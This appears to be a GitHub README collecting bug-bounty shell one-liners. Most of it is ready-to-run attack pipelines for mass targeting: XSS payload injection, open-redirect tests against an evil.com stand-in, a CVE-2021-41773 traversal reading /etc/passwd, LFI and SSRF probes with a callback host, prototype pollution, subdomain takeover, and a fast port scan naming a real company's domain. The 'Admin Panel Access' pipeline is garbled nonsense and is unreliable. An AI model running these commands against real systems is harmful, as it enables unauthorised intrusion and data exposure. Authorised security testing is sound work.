# One-Liner-Scripts
A collection of awesome one-liner scripts especially for bug bounty.


**XSS**

```
echo "target.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```

**OpenRedirect**

```
waybackurls target.com | grep -a -i \=http | qsreplace 'https://evil.com' | while read host do;do curl -s -L $host -I|grep "https://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```

**SubDomain TakeOver**

```
cat subdomains.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" > cname.txt
```
```
cat cname.txt | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
```

**CVE-2021-41773**

```
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```

**XSS**

```
cat urls.txt | kxss | awk ‘{print $4}’| sort -u | dalfox pipe -b <you blind xss> — custom-payload <your payload> -w 300 — multicast — mass — only-poc -o xss_vulns.txt
```
```
cat urls.txt | kxss | awk ‘{print $4}’| sort -u >> xss_list.txt
```

**Hidden Dirs**
```
dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://target
```

**Open Redirect**

```
subfinder -silent -d domain | anew subdomains.txt | httpx -silent | anew urls.txt | hakrawler | anew endpoints.txt | while read url; do curl $url --insecure | haklistgen | anew wordlist.txt; done
```
```
cat subdomains.txt urls.txt endpoints.txt | haklistgen | anew wordlist.txt;
```

**Hidden Params in JS**

```
cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```

**LFI**

```
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

**XSS**

```
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```

**Prototype Pollution**

```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

**PortScan without Waf**

```
subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

**SubDomain Takeover**

```
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

**Hidden Servers & Admin Panels**

```
ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 
```

**XSS**

```
waybackurls target.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```

**SSRF**

```
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```

**Admin Panel Access**

```
cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
```

**Extract sensitive end-point in JS**

```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```




**More Scripts Coming Sooon.....**
